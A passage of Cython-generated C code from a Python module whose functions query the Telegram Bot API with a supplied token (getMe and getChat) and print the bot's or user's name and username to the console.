  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_7, __pyx_kp_u__7) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u__7);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.loading_animation", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_loading_chars);
  __Pyx_XDECREF(__pyx_v_char);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7get_bot_info(PyObject *__pyx_self, PyObject *__pyx_v_token); /*proto*/
static PyMethodDef __pyx_mdef_6source_7get_bot_info = {"get_bot_info", (PyCFunction)__pyx_pw_6source_7get_bot_info, METH_O, 0};
static PyObject *__pyx_pw_6source_7get_bot_info(PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_bot_info (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_6get_bot_info(__pyx_self, ((PyObject *)__pyx_v_token));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_6get_bot_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_first_name = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_bot_info", 0);

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_2 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_getMe);
  __pyx_t_2 += 6;
  __Pyx_GIVEREF(__pyx_kp_u_getMe);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_getMe);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_url = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 200, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 200, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_1, __pyx_v_url) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_url);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 200, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_response = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 202, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyInt_EqObjC(__pyx_t_4, __pyx_int_200, 0xC8, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 202, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 202, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_6) {

    
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 203, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_v_data = __pyx_t_5;
    __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_ok); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 204, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 204, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (__pyx_t_6) {

      
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 205, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_first_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 205, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_first_name = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 206, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_username); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 206, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_username = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = PyTuple_New(9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_2 = 0;
      __pyx_t_3 = 127;
      __Pyx_INCREF(__pyx_kp_u_);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u_);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_G6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_1);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_1);
      __pyx_t_1 = 0;
      __Pyx_INCREF(__pyx_kp_u__8);
      __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
      __pyx_t_2 += 13;
      __Pyx_GIVEREF(__pyx_kp_u__8);
      PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__8);
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_B6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__9);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 17;
      __Pyx_GIVEREF(__pyx_kp_u__9);
      PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__9);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_first_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_s);
      __pyx_t_3 = (65535 > __pyx_t_3) ? 65535 : __pyx_t_3;
      __pyx_t_2 += 22;
      __Pyx_GIVEREF(__pyx_kp_u_s);
      PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_kp_u_s);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
      __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_);
      __pyx_t_2 += 1;
      __Pyx_GIVEREF(__pyx_kp_u_);
      PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_kp_u_);
      __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 9, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 207, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      goto __pyx_L4;
    }

    
    /*else*/ {
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __pyx_L4:;

    
    goto __pyx_L3;
  }

  
  /*else*/ {

    
    __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 213, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = 0;
    __pyx_t_3 = 127;
    __Pyx_INCREF(__pyx_kp_u__11);
    __pyx_t_2 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__11);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__11);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_red6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 213, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 213, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_3;
    __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u_s_s);
    __pyx_t_3 = (1114111 > __pyx_t_3) ? 1114111 : __pyx_t_3;
    __pyx_t_2 += 64;
    __Pyx_GIVEREF(__pyx_kp_u_s_s);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_s_s);
    __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 213, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.get_bot_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_first_name);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_9get_user_info(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_9get_user_info = {"get_user_info", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_9get_user_info, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_9get_user_info(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_token = 0;
  PyObject *__pyx_v_user_id = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_user_info (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_token,&__pyx_n_s_user_id,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_token)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user_id)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("get_user_info", 1, 2, 2, 1); __PYX_ERR(0, 218, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "get_user_info") < 0)) __PYX_ERR(0, 218, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_token = values[0];
    __pyx_v_user_id = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("get_user_info", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 218, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.get_user_info", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_8get_user_info(__pyx_self, __pyx_v_token, __pyx_v_user_id);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8get_user_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token, PyObject *__pyx_v_user_id) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_user_info = NULL;
  PyObject *__pyx_v_first_name = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_user_info", 0);

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 219, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_2 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 219, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_getChat);
  __pyx_t_2 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_getChat);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_getChat);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 219, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_url = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_chat_id, __pyx_v_user_id) < 0) __PYX_ERR(0, 220, __pyx_L1_error)
  __pyx_v_params = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v_url);
  __Pyx_GIVEREF(__pyx_v_url);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 223, __pyx_L1_error)
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_response = __pyx_t_6;
  __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = __Pyx_PyInt_EqObjC(__pyx_t_6, __pyx_int_200, 0xC8, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_7) {

    
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 226, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 226, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_v_data = __pyx_t_5;
    __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_ok); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 227, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 227, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (__pyx_t_7) {

      
      __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_data, __pyx_n_u_result); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 228, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_v_user_info = __pyx_t_5;
      __pyx_t_5 = 0;

      
